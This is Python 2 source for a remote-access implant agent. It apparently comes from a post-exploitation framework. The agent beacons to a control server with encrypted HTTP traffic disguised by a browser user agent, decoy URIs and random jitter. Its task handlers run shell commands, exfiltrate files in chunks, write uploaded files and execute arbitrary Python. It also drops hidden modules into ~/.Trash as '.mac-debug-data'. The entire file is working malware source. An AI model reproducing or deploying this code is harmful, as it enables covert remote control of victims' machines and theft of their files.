import struct, time, base64, subprocess, random, time, datetime
from os.path import expanduser
from StringIO import StringIO
from threading import Thread
import os
import sys
import trace
import shlex
import zlib
import threading
import BaseHTTPServer


################################################
#
# agent configuration information
#
################################################

# print "starting agent"

# profile format ->
#   tasking uris | user agent | additional header 1 | additional header 2 | ...
profile = "/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"

if server.endswith("/"): server = server[0:-1]

delay = 60
jitter = 0.0
lostLimit = 60
missedCheckins = 0
jobMessageBuffer = ""

# killDate form -> "MO/DAY/YEAR"
killDate = "" 
# workingHours form -> "9:00-17:00"
workingHours = ""

parts = profile.split("|")
taskURIs = parts[0].split(",")
userAgent = parts[1]
headersRaw = parts[2:]

defaultPage = base64.b64decode("")

jobs = []

# global header dictionary
#   sessionID is set by stager.py
headers = {'User-Agent': userAgent, "Cookie": "SESSIONID=%s" %(sessionID)}

# parse the headers into the global header dictionary
for headerRaw in headersRaw:
    try:
        headerKey = headerRaw.split(":")[0]
        headerValue = headerRaw.split(":")[1]

        if headerKey.lower() == "cookie":
            headers['Cookie'] = "%s;%s" %(headers['Cookie'], headerValue)
        else:
            headers[headerKey] = headerValue
    except:
        pass


################################################
#
# communication methods
#
################################################

def sendMessage(packets=None):
    """
    Requests a tasking or posts data to a randomized tasking URI.

    If packets == None, the agent GETs a tasking from the control server.
    If packets != None, the agent encrypts the passed packets and 
        POSTs the data to the control server.
    """
    global missedCheckins
    global server
    global headers
    global taskURIs

    data = None
    if packets:
        data = "".join(packets)
        data = aes_encrypt_then_hmac(key, data)

    taskURI = random.sample(taskURIs, 1)[0]
    if (server.endswith(".php")):
        # if we have a redirector host already
        requestUri = server
    else:
        requestUri = server + taskURI

    try:
        data = (urllib2.urlopen(urllib2.Request(requestUri, data, headers))).read()
        return ("200", data)
    except urllib2.HTTPError as HTTPError:
        # if the server is reached, but returns an erro (like 404)
        missedCheckins = missedCheckins + 1
        return (HTTPError.code, "")
    except urllib2.URLError as URLerror:
        # if the server cannot be reached
        missedCheckins = missedCheckins + 1
        return (URLerror.reason, "")

    return ("","")


################################################
#
# encryption methods
#
################################################

def encodePacket(taskingID, packetData):
    """
    Encode a response packet.

        [4 bytes] - type
        [4 bytes] - counter
        [4 bytes] - length
        [X...]    - tasking data
    """

    # packetData = packetData.encode('utf-8').strip()

    taskID = struct.pack('=L', taskingID)
    counter = struct.pack('=L', 0)
    if(packetData):
        length = struct.pack('=L',len(packetData))
    else:
        length = struct.pack('=L',0)

    # b64data = base64.b64encode(packetData)

    if(packetData):
        packetData = packetData.decode('ascii', 'ignore').encode('ascii')

    return taskID + counter + length + packetData


def decodePacket(packet, offset=0):
    """
    Parse a tasking packet, returning (PACKET_TYPE, counter, length, data, REMAINING_PACKETES)

        [4 bytes] - type
        [4 bytes] - counter
        [4 bytes] - length
        [X...]    - tasking data
        [Y...]    - remainingData (possibly nested packet)
    """

    try:
        responseID = struct.unpack('=L', packet[0+offset:4+offset])[0]
        counter = struct.unpack('=L', packet[4+offset:8+offset])[0]
        length = struct.unpack('=L', packet[8+offset:12+offset])[0]
        # data = base64.b64decode(packet[12+offset:12+offset+length])
        data = packet[12+offset:12+offset+length]
        remainingData = packet[12+offset+length:]
        return (responseID, counter, length, data, remainingData)
    except Exception as e:
        print "decodePacket exception:",e
        return (None, None, None, None, None)


def processTasking(data):
    # processes an encrypted data packet
    #   -decrypts/verifies the response to get
    #   -extracts the packets and processes each

    try:
        tasking = aes_decrypt_and_verify(key, data)
        (taskingID, counter, length, data, remainingData) = decodePacket(tasking)

        # if we get to this point, we have a legit tasking so reset missedCheckins
        missedCheckins = 0

        # execute/process the packets and get any response
        resultPackets = ""
        result = processPacket(taskingID, data)
        if result:
            resultPackets += result

        packetOffset = 12 + length

        while remainingData and remainingData != "":

            (taskingID, counter, length, data, remainingData) = decodePacket(tasking, offset=packetOffset)

            result = processPacket(taskingID, data)
            if result:
                resultPackets += result

            packetOffset += 12 + length

        sendMessage(resultPackets)

    except Exception as e:
        print "processTasking exception:",e
        pass

def processJobTasking(result):
    # process job data packets
    #  - returns to the C2
    # execute/process the packets and get any response
    try:
        resultPackets = ""
        if result:
            resultPackets += result
        # send packets
        sendMessage(resultPackets)
    except Exception as e:
        print "processJobTasking exception:",e
        pass

def processPacket(taskingID, data):

    try:
        taskingID = int(taskingID)
    except Exception as e:
        return None

    if taskingID == 1:
        # sysinfo request
        # get_sysinfo should be exposed from stager.py
        return encodePacket(1, get_sysinfo())

    elif taskingID == 2:
        # agent exit

        msg = "[!] Agent %s exiting" %(sessionID)
        sendMessage(encodePacket(2, msg))
        agent_exit()

    elif taskingID == 40:
        # run a command
        resultData = str(run_command(data))
        return encodePacket(40, resultData)

    elif taskingID == 41:
        # file download

        filePath = os.path.abspath(data)
        if not os.path.exists(filePath):
            return encodePacket(40, "file does not exist or cannot be accessed")

        offset = 0
        size = os.path.getsize(filePath)
        print "file size " + str(size)
        partIndex = 0

        while True:

            # get 512kb of the given file starting at the specified offset
            encodedPart = get_file_part(filePath, offset=offset, base64=False)
            c = compress()
            start_crc32 = c.crc32_data(encodedPart)
            comp_data = c.comp_data(encodedPart)
            encodedPart = c.build_header(comp_data, start_crc32)
            encodedPart = base64.b64encode(encodedPart)

            partData = "%s|%s|%s" %(partIndex, filePath, encodedPart)
            print len(encodedPart)
            if not encodedPart or encodedPart == '' or len(encodedPart) == 16:
                print "here"
                break

            sendMessage(encodePacket(41, partData))

            global delay
            global jitter
            if jitter < 0: jitter = -jitter
            if jitter > 1: jitter = 1/jitter

            minSleep = int((1.0-jitter)*delay)
            maxSleep = int((1.0+jitter)*delay)
            sleepTime = random.randint(minSleep, maxSleep)
            time.sleep(sleepTime)
            partIndex += 1
            offset += 5120000

    elif taskingID == 42:
        # file upload
        try:
            parts = data.split("|")
            filePath = parts[0]
            base64part = parts[1]
            raw = base64.b64decode(base64part)
            d = decompress()
            dec_data = d.dec_data(raw, cheader=True)
            if not dec_data['crc32_check']:
                sendMessage(encodePacket(0, "[!] WARNING: File upload failed crc32 check during decompressing!."))
                sendMessage(encodePacket(0, "[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!." %(dec_data['header_crc32'],dec_data['dec_crc32'],dec_data['crc32_check'])))
            f = open(filePath, 'ab')
            f.write(raw)
            f.close()

            sendMessage(encodePacket(42, "[*] Upload of %s successful" %(filePath) ))
        except Exception as e:
            sendMessage(encodePacket(0, "[!] Error in writing file %s during upload: %s" %(filePath, str(e)) ))

    elif taskingID == 50:
        # return the currently running jobs
        msg = ""
        if len(jobs) == 0:
            msg = "No active jobs"
        else:
            msg = "Active jobs:\n"
            for x in xrange(len(jobs)):
                msg += "\t%s" %(x)
        return encodePacket(50, msg)

    elif taskingID == 51:
        # stop and remove a specified job if it's running
        try:
            # Calling join first seems to hang
            # result = jobs[int(data)].join()
            sendMessage(encodePacket(0, "[*] Attempting to stop job thread"))
            result = jobs[int(data)].kill()
            sendMessage(encodePacket(0, "[*] Job thread stoped!"))
            jobs[int(data)]._Thread__stop()
            jobs.pop(int(data))
            if result and result != "":
                sendMessage(encodePacket(51, result))
        except:
            return encodePacket(0, "error stopping job: %s" %(data))

    elif taskingID == 100:
        # dynamic code execution, wait for output, don't save outputPicl
        try:
            buffer = StringIO()
            sys.stdout = buffer
            code_obj = compile(data, '<string>', 'exec')
            exec code_obj in globals()
            sys.stdout = sys.__stdout__
            results = buffer.getvalue()
            return encodePacket(100, str(results))
        except Exception as e:
            errorData = str(buffer.getvalue())
            return encodePacket(0, "error executing specified Python data: %s \nBuffer data recovered:\n%s" %(e, errorData))

    elif taskingID == 101:
        # dynamic code execution, wait for output, save output
        prefix = data[0:15].strip()
        extension = data[15:20].strip()
        data = data[20:]
        try:
            buffer = StringIO()
            sys.stdout = buffer
            code_obj = compile(data, '<string>', 'exec')
            exec code_obj in globals()
            sys.stdout = sys.__stdout__
            c = compress()
            start_crc32 = c.crc32_data(buffer.getvalue())
            comp_data = c.comp_data(buffer.getvalue())
            encodedPart = c.build_header(comp_data, start_crc32)
            encodedPart = base64.b64encode(encodedPart)
            return encodePacket(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + encodedPart )
        except Exception as e:
            # Also return partial code that has been executed
            errorData = str(buffer.getvalue())
            return encodePacket(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData))

    elif taskingID == 102:
        # on disk code execution for modules that require multiprocessing not supported by exec
        try:
            implantHome = expanduser("~") + '/.Trash/'
            moduleName = ".mac-debug-data"
            implantPath = implantHome + moduleName
            result = "[*] Module disk path: %s \n" %(implantPath) 
            with open(implantPath, 'w') as f:
                f.write(data)
            result += "[*] Module properly dropped to disk \n"
            pythonCommand = "python %s" %(implantPath)
            process = subprocess.Popen(pythonCommand, stdout=subprocess.PIPE, shell=True)
            data = process.communicate()
            result += data[0].strip()
            try:
                os.remove(implantPath)
                result += "\n[*] Module path was properly removed: %s" %(implantPath) 
            except Exception as e:
                print "error removing module filed: %s" %(e)
            fileCheck = os.path.isfile(implantPath)
            if fileCheck:
                result += "\n\nError removing module file, please verify path: " + str(implantPath)
            return encodePacket(100, str(result))
        except Exception as e:
            fileCheck = os.path.isfile(implantPath)
            if fileCheck:
                return encodePacket(0, "error executing specified Python data: %s \nError removing module file, please verify path: %s" %(e, implantPath))
            return encodePacket(0, "error executing specified Python data: %s" %(e))

    elif taskingID == 110:
        start_job(data)
        return encodePacket(110, "job %s started" %(len(jobs)-1))

    elif taskingID == 111:
        # TASK_CMD_JOB_SAVE
        # TODO: implement job structure
        pass

    else:
        return encodePacket(0, "invalid tasking ID: %s" %(taskingID))


################################################
#
# misc methods
#
################################################
class compress(object):
    
    '''
    Base clase for init of the package. This will handle
    the initial object creation for conducting basic functions.
    '''

    CRC_HSIZE = 4
    COMP_RATIO = 9

    def __init__(self, verbose=False):
        """
        Populates init.
        """
        pass

    def comp_data(self, data, cvalue=COMP_RATIO):
        '''
        Takes in a string and computes
        the comp obj.
        data = string wanting compression
        cvalue = 0-9 comp value (default 6)
        '''
        cdata = zlib.compress(data,cvalue)
        return cdata

    def crc32_data(self, data):
        '''
        Takes in a string and computes crc32 value.
        data = string before compression
        returns:
        HEX bytes of data
        '''
        crc = zlib.crc32(data) & 0xFFFFFFFF
        return crc

    def build_header(self, data, crc):
        '''
        Takes comp data, org crc32 value,
        and adds self header.
        data =  comp data
        crc = crc32 value
        '''
        header = struct.pack("!I",crc)
        built_data = header + data
        return built_data

class decompress(object):
    
    '''
    Base clase for init of the package. This will handle
    the initial object creation for conducting basic functions.
    '''

    CRC_HSIZE = 4
    COMP_RATIO = 9

    def __init__(self, verbose=False):
        """
        Populates init.
        """
        pass

    def dec_data(self, data, cheader=True):
        '''
        Takes:
        Custom / standard header data
        data = comp data with zlib header
        BOOL cheader = passing custom crc32 header
        returns:
        dict with crc32 cheack and dec data string
        ex. {"crc32" : true, "dec_data" : "-SNIP-"}
        '''
        if cheader:
            comp_crc32 = struct.unpack("!I", data[:self.CRC_HSIZE])[0]
            dec_data = zlib.decompress(data[self.CRC_HSIZE:])
            dec_crc32 = zlib.crc32(dec_data) & 0xFFFFFFFF
            if comp_crc32 == dec_crc32:
                crc32 = True
            else:
                crc32 = False
            return { "header_crc32" : comp_crc32, "dec_crc32" : dec_crc32, "crc32_check" : crc32, "data" : dec_data }
        else:
            dec_data = zlib.decompress(data)
            return dec_data

def agent_exit():
    # exit for proper job / thread cleanup
    if len(jobs) > 0:
        try:
            for x in jobs:
                jobs[int(x)].kill()
                jobs.pop(x)
        except:
            # die hard if thread kill fails
            pass
    exit()

def indent(lines, amount=4, ch=' '):
    padding = amount * ch
    return padding + ('\n'+padding).join(lines.split('\n'))


# from http://stackoverflow.com/questions/6893968/how-to-get-the-return-value-from-a-thread-in-python
class ThreadWithReturnValue(Thread):
    def __init__(self, group=None, target=None, name=None,
                 args=(), kwargs={}, Verbose=None):
        Thread.__init__(self, group, target, name, args, kwargs, Verbose)
        self._return = None
    def run(self):
        if self._Thread__target is not None:
            self._return = self._Thread__target(*self._Thread__args,
                                                **self._Thread__kwargs)
    def join(self):
        Thread.join(self)
        return self._return


class KThread(threading.Thread):

    """A subclass of threading.Thread, with a kill()
  method."""

    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run      # Force the Thread toinstall our trace.
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function, which installs the
    trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True



def start_job(code):

    global jobs

    # create a new code block with a defined method name
    codeBlock = "def method():\n" + indent(code)

    # register the code block
    code_obj = compile(codeBlock, '<string>', 'exec')
    # code needs to be in the global listing
    # not the locals() scope
    exec code_obj in globals()

    # create/processPacketstart/return the thread
    # call the job_func so sys data can be cpatured
    codeThread = KThread(target=job_func)
    codeThread.start()

    jobs.append(codeThread)


def job_func():
    try:
        old_stdout = sys.stdout  
        sys.stdout = mystdout = StringIO()
        # now call the function required 
        # and capture the output via sys
        method()
        sys.stdout = old_stdout
        dataStats_2 = mystdout.getvalue()
        result = encodePacket(110, str(dataStats_2))
        processJobTasking(result)
    except Exception as e:
        p = "error executing specified Python job data: " + str(e)
        result = encodePacket(0, p)
        processJobTasking(result)

def job_message_buffer(message):
    # Supports job messages for checkin
    global jobMessageBuffer
    try:

        jobMessageBuffer += str(message)
    except Exception as e:
        print e

def get_job_message_buffer():
    global jobMessageBuffer
    try:
        result = encodePacket(110, str(jobMessageBuffer))
        jobMessageBuffer = ""
        return result
    except Exception as e:
        return encodePacket(0, "[!] Error getting job output: %s" %(e))

def send_job_message_buffer():
    if len(jobs) > 0:
        result = get_job_message_buffer()
        processJobTasking(result)
    else:
        pass

def start_webserver(data, ip, port, serveCount):
    # thread data_webserver for execution
    t = threading.Thread(target=data_webserver, args=(data, ip, port, serveCount))
    t.start()
    return

def data_webserver(data, ip, port, serveCount):
    # hosts a file on port and IP servers data string
    hostName = str(ip) 
    portNumber = int(port)
    data = str(data)
    serveCount = int(serveCount)
    count = 0
    class serverHandler(BaseHTTPServer.BaseHTTPRequestHandler):
        def do_GET(s):
            """Respond to a GET request."""
            s.send_response(200)
            s.send_header("Content-type", "text/html")
            s.end_headers()
            s.wfile.write(data)
        def log_message(s, format, *args):
            return
    server_class = BaseHTTPServer.HTTPServer
    httpServer = server_class((hostName, portNumber), serverHandler)
    try:
        while (count < serveCount):
            httpServer.handle_request()
            count += 1
    except:
        pass
    httpServer.server_close()
    return

# additional implementation methods
def run_command(command):
    if "|" in command:    
        command_parts = command.split('|')
    elif ">" in command or ">>" in command or "<" in command or "<<" in command:   
        p = subprocess.Popen(command,stdin=None, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
        return ''.join(list(iter(p.stdout.readline, b'')))
    else:
        command_parts = []
        command_parts.append(command)
    i = 0
    p = {}
    for command_part in command_parts:
        command_part = command_part.strip()
        if i == 0:
            p[i]=subprocess.Popen(shlex.split(command_part),stdin=None, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            p[i]=subprocess.Popen(shlex.split(command_part),stdin=p[i-1].stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        i = i +1
    (output, err) = p[i-1].communicate()
    exit_code = p[0].wait()
    if exit_code != 0:
        errorStr =  "Shell Output: " + str(output) + '\n'
        errorStr += "Shell Error: " + str(err) + '\n'
        return errorStr
    else:
        return str(output)


def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):

    if not os.path.exists(filePath):
        return ''

    f = open(filePath, 'rb')
    print offset
    f.seek(offset, 0)
    data = f.read(chunkSize)
    f.close()
    if base64: 
        return base64.b64encode(data)
    else:
        return data

################################################
#
# main agent functionality
#
################################################

while(True):

    # TODO: jobs functionality

    if workingHours != "":
        try:
            start,end = workingHours.split("-")
            now = datetime.datetime.now()
            startTime = datetime.datetime.strptime(start, "%H:%M")
            endTime = datetime.datetime.strptime(end, "%H:%M")

            if not (startTime <= now <= endTime):
                sleepTime = startTime - now
                # print "not in working hours, sleeping %s seconds" %(sleepTime.seconds)
                # sleep until the start of the next window
                time.sleep(sleepTime.seconds)

        except Exception as e:
            pass

    # check if we're past the killdate for this agent
    #   killDate form -> MO/DAY/YEAR
    if killDate != "":
        now = datetime.datetime.now().date()
        killDateTime = datetime.datetime.strptime(killDate, "%m/%d/%Y").date()
        if now > killDateTime:
            msg = "[!] Agent %s exiting" %(sessionID)
            sendMessage(encodePacket(2, msg))
            agent_exit()

    # exit if we miss commnicating with the server enough times
    if missedCheckins >= lostLimit:
        agent_exit()

    # sleep for the randomized interval
    if jitter < 0: jitter = -jitter
    if jitter > 1: jitter = 1/jitter
    minSleep = int((1.0-jitter)*delay)
    maxSleep = int((1.0+jitter)*delay)

    sleepTime = random.randint(minSleep, maxSleep)
    time.sleep(sleepTime)

    (code, data) = sendMessage()
    if code == "200":
        try:
            send_job_message_buffer()
        except Exception as e:
            result = encodePacket(0, str('[!] Failed to check job buffer!: ' + str(e)))
            processJobTasking(result)
        if data == defaultPage:
            missedCheckins = 0
        else:
            processTasking(data)
    else:
        pass
        # print "invalid code:",code
